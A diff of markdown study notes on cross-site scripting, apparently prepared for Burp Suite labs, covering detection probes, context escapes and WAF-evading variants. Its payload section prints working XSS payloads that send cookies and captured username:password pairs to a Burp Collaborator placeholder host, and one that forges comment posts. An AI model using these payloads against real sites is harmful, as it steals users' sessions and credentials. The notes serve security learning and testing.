@@ -10,11 +10,11 @@
 - DOM Invader - Burp Suite Browser Extension
 
 # What is it?
-When an attacker is able to inject javascript into a website
-Three types:
-- Reflected
-- Stored
-- DOM
+- When an attacker is able to inject javascript into a website
+- Three types:
+    - Reflected
+    - Stored
+    - DOM
 
 # Recognition
 - Remember that HTML parsing occurs before Javascript parsing
@@ -23,7 +23,7 @@ Three types:
 - Is there any special handling for data? Do urls get turned into links?
 - How are special characters handled? insert '<>:;"\/ to find out if they are being encoded.
 ```html
-"><u>test123
+'"<a><<adsa>>\';//
 ```
 - Introduce an event handler
 ```html
@@ -42,9 +42,10 @@ print()
 - After that, use `Inspect` to check the DOM, also check the source code with the`view-source` functionality, or the HTTP response
 - Determine the context where the input is seen 
 - Figure out how to execute javascript within the context
+- Determine what is getting encoded: ' " / \ < > ?
 ```html
-Determine what is getting encoded: ' " / \ < > ?
 test123;//
+'"<a><<adsa>>\';//
 </script>test123<img src=x onerror=alert(1)>
 '; alert(1)//test123
 %23f5f5f5</style>test123<script>alert(1)</script>
@@ -64,7 +65,7 @@ javascript:alert(document.cookie)
 - Some payloads might not be allowed via the UI but sending them via the HTTP request on burp suite bypasses these controls
 
 # Some Exploit payloads
-Payload 1
+- Payload 1
 ```js
 var xhr = new XMLHttpRequest();
 xhr.onload=function(){
@@ -75,13 +76,13 @@ xhr.onload=function(){
 xhr.open('GET', 'URL');
 xhr.send();
 ```
-Payload 2
+- Payload 2
 ```js
 var xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://burp-collaborator/?'+btoa(document.cookie));
 xhr.send();
 ```
-Payload 3
+- Payload 3
 ```html
 <script>
 fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
@@ -91,7 +92,7 @@ body:document.cookie
 });
 </script>
 ```
-Payload 4
+- Payload 4
 ```html
 <!--watch video "CSRF XSS payload example"-->
 <script>
@@ -114,7 +115,7 @@ fetch('/post/comment', {
 });
 </script>
 ```
-Payload 5
+- Payload 5
 ```html
 <input name=username id=username>
 <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
@@ -123,14 +124,14 @@ mode: 'no-cors',
 body: username.value+':'+this.value
 });">
 ```
-Payload 6
+- Payload 6
 ```html
 <script>
 location = 'url-here';
 </script>
 ```
-[CSRF XSS payload example](https://www.youtube.com/watch?v=N_87S9XVy0w)
-[Password Autofill-Payload example](https://www.youtube.com/watch?v=I6TOtXSOZ90)
+- [CSRF XSS payload example](https://www.youtube.com/watch?v=N_87S9XVy0w)
+- [Password Autofill-Payload example](https://www.youtube.com/watch?v=I6TOtXSOZ90)
 
 # XSS Context
 - Remember that HTML parsing occurs before Javascript parsing
@@ -162,7 +163,7 @@ ${insert-payload-here}
     - AngularJS
         - ng-app: If this attribute is used on a HTML element AngularJS will execute javascript inside double curly braces `{{$on.constructor('alert(1)')()}}`
 # Obfuscation
-Some payloads may need to be obfuscated to bypass WAF
+- Some payloads may need to be obfuscated to bypass WAF
 ```html
 <img src=1 oNeRrOr=alert`1`>
 ```
